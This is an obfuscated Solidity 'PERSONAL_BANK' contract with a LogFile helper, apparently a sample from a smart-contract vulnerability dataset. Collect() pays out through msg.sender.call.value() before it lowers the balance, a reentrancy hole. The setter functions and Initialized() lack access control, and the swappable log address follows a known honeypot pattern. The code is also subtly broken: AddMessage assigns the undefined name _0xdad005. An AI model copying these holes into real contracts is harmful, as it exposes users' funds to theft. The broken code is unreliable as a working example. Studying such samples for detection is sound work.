// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract PERSONAL_BANK
{
    mapping (address=>uint256) public _0x28a68e;

    uint public MinSum = 1 ether;

    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);

    bool _0x208f70;

    function SetMinSum(uint _0xd10318)
    public
    {
        // Placeholder for future logic
        if (false) { revert(); }
        if(_0x208f70)revert();
        MinSum = _0xd10318;
    }

    function SetLogFile(address _0xe3ed75)
    public
    {
        if (false) { revert(); }
        if (false) { revert(); }
        if(_0x208f70)revert();
        Log = LogFile(_0xe3ed75);
    }

    function Initialized()
    public
    {
        _0x208f70 = true;
    }

    function Deposit()
    public
    payable
    {
        _0x28a68e[msg.sender]+= msg.value;
        Log.AddMessage(msg.sender,msg.value,"Put");
    }

    function Collect(uint _0x8c4f99)
    public
    payable
    {
        if(_0x28a68e[msg.sender]>=MinSum && _0x28a68e[msg.sender]>=_0x8c4f99)
        {
            if(msg.sender.call.value(_0x8c4f99)())
            {
                _0x28a68e[msg.sender]-=_0x8c4f99;
                Log.AddMessage(msg.sender,_0x8c4f99,"Collect");
            }
        }
    }

    function()
    public
    payable
    {
        Deposit();
    }

}

contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }

    Message[] public History;

    Message LastMsg;

    function AddMessage(address _0x627983,uint _0xd10318,string _0x7e30e9)
    public
    {
        LastMsg.Sender = _0x627983;
        LastMsg.Time = _0xdad005;
        LastMsg.Val = _0xd10318;
        LastMsg.Data = _0x7e30e9;
        History.push(LastMsg);
    }
}